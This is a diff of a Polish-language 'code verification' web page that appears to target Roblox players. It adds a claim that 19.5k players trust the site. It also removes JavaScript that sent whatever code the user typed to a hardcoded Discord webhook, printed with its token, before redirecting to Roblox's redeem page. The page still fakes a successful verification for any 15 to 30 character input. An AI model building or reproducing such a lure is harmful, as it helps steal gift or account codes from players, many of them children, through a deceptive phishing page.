@@ -29,6 +29,30 @@
       border-radius: 10px;
       text-align: center;
     }
+    /* Panel po lewej */
+    .side-box {
+      position: absolute;
+      left: 20px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: rgba(0,0,0,0.6);
+      padding: 20px;
+      border-radius: 10px;
+      width: 220px;
+      text-align: center;
+      z-index: 1;
+    }
+    .side-box h3 {
+      margin: 0;
+      font-size: 20px;
+      font-weight: normal;
+    }
+    .side-box p {
+      margin-top: 10px;
+      font-size: 22px;
+      font-weight: bold;
+      color: #4CAF50; /* zielony */
+    }
     input {
       padding: 10px;
       margin-top: 10px;
@@ -53,6 +77,13 @@
 <body>
   <canvas id="bg"></canvas>
 
+  <!-- Panel po lewej -->
+  <div class="side-box">
+    <h3>Zaufało nam</h3>
+    <p>19,5k Graczy!</p>
+  </div>
+
+  <!-- Główne okno na środku -->
   <div class="content">
     <h1>Wpisz kod Weryfikacji!</h1>
     <input type="password" id="code" placeholder="Podaj kod ">
@@ -95,12 +126,11 @@
     }
     animate();
 
-    // Sprawdzanie kodu i wysyłanie na webhook
+    // Sprawdzanie kodu
     function checkCode() {
       const code = document.getElementById("code").value;
       const message = document.getElementById("message");
 
-      // Sprawdzenie, czy kod ma od 15 do 30 znaków (dowolne znaki)
       const regex = /^.{15,30}$/;
       if (!regex.test(code)) {
         message.textContent = "Błędny Kod!";
@@ -109,16 +139,7 @@
 
       message.textContent = "Weryfikacja udana!";
 
-      // Wyślij kod na webhook Discorda
-      const webhookURL = "https://discord.com/api/webhooks/1412869587812483155/Rlwfr3ujrFi8feJDj0qMMHB6uLiNwqzeiTtRr6BxfvfQMw3sdY7w6LtoHRrBA5RIbzRE";
-      fetch(webhookURL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: `Kod użytkownika: ${code}` })
-      }).catch(err => console.error(err));
-
-      // Przekierowanie na stronę Roblox
-      window.location.href = "https://www.roblox.com/redeem";
+      // tu był webhook i przekierowanie
     }
 
     window.addEventListener('resize', () => {
